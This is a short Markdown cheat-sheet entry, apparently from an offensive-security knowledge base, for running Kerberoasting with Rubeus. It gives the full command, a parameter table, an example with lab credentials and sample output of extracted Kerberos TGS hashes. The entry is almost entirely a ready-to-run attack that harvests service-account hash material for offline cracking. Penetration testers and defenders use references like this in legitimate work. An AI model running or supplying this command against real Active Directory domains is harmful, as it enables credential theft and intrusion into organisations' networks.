---
type: command
executor: cmd
data: >-
  Rubeus.exe kerberoast /creduser:DOMAIN\USER /credpassword:PASSWORD
  /outfile:hashes.txt
tags:
  - kerberoasting
platforms:
  - Windows
verified: true
validated: true
---

# rubeus-kerberoast-with-creds

## Command

```cmd
Rubeus.exe kerberoast /creduser:DOMAIN\USER /credpassword:PASSWORD /outfile:hashes.txt
```

## Description

Performs Kerberoasting using specified credentials to request TGS tickets for all SPNs, exporting RC4 hashes to a file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /creduser:DOMAIN\USER | Username for auth | Yes |
| /credpassword:PASSWORD | Password | Yes |
| /outfile:hashes.txt | Output file for hashes | Yes |

## Examples

### Basic Usage

```cmd
Rubeus.exe kerberoast /creduser:LAB\user /credpassword:Pass123 /outfile:hashes.txt
```

## Expected Output

[*] Action: Kerberoast
[*] Output file: hashes.txt
$krb5tgs$23$*svc$LAB$SPN$*...<hash>

## Related

- [[procedures/Kerberoasting-with-Rubeus]]
- [[tools/Rubeus]]
